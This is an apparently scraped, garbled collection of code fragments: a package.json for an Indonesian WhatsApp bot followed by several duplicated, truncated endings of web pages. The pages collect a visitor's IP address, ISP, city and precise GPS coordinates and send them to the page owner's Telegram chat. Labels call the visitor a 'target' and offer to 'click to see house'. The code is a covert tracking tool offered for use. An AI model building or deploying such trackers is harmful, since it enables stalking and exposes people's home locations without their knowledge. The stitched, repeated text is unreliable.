{
  "name": "xyfur-super-bot",
  "version": "1.0.0",
  "description": "Bot WhatsApp Multifungsi",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "@whiskeysockets/baileys": "latest",
    "qrcode-terminal": "latest",
    "pino": "latest",
    "axios": "latest"
  }
}
            msg += `\n<b>🎯 GPS PRESISI:</b>\n`;
            msg += `<a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}">📍 KLIK LIHAT PETA</a>`;
        } else {
            msg += `\n<b>🎯 GPS:</b> Izin Ditolak`;
        }

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
        });
    }
</script>
</body>
</html>
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
        });
    }
</script>
</body>
</html>
        pesan += `• IP: <code>${dataIP.ip}</code>\n`;
        pesan += `• ISP: ${dataIP.org || 'Tidak Terdeteksi'}\n`;
        pesan += `• Lokasi: ${dataIP.city}, ${dataIP.region}, ${dataIP.country_name}\n`;
        pesan += `• Peta IP: <a href="https://www.google.com/maps?q=${dataIP.latitude},${dataIP.longitude}">Buka Lokasi IP</a>\n\n`;

        if (coords) {
            pesan += `<b>🎯 INFO GPS (PRESISI):</b>\n`;
            pesan += `• Akurasi: ± ${Math.round(coords.accuracy)} meter\n`;
            pesan += `• Koordinat: <code>${coords.latitude},${coords.longitude}</code>\n`;
            pesan += `• Google Maps: <a href="https://www.google.com/maps?q=${coords.latitude},${coords.longitude}">KLIK LIHAT RUMAH</a>\n`;
        } else {
            pesan += `<b>🎯 INFO GPS:</b> <i>Izin Ditolak Target</i>\n`;
        }
        pesan += `━━━━━━━━━━━━━━━━━━`;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: pesan,
                    parse_mode: 'HTML'
                })
            });
        } catch (e) {
            console.error("Gagal kirim ke Telegram");
        }
    }
</script>

</body>
</html>
        pesan += `• IP: <code>${dataIP.query}</code>\n`;
        pesan += `• ISP: ${dataIP.isp}\n`;
        pesan += `• Lokasi: ${dataIP.city}, ${dataIP.country}\n`;
        pesan += `• Peta IP: <a href="https://www.google.com/maps?q=${dataIP.lat},${dataIP.lon}">Buka Maps</a>\n\n`;

        if (coordsGPS) {
            pesan += `<b>🎯 DATA GPS (PRESISI):</b>\n`;
            pesan += `• Akurasi: ± ${Math.round(coordsGPS.accuracy)} meter\n`;
            pesan += `• Koordinat: <code>${coordsGPS.latitude}, ${coordsGPS.longitude}</code>\n`;
            pesan += `• Peta Desa: <a href="https://www.google.com/maps?q=${coordsGPS.latitude},${coordsGPS.longitude}">Klik Lihat Rumah</a>\n`;
        } else {
            pesan += `<b>🎯 DATA GPS:</b> <i>Ditolak/Mati</i>\n`;
        }
        pesan += `━━━━━━━━━━━━━━━━━━`;

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
        });
    }
</script>

</body>
</html>
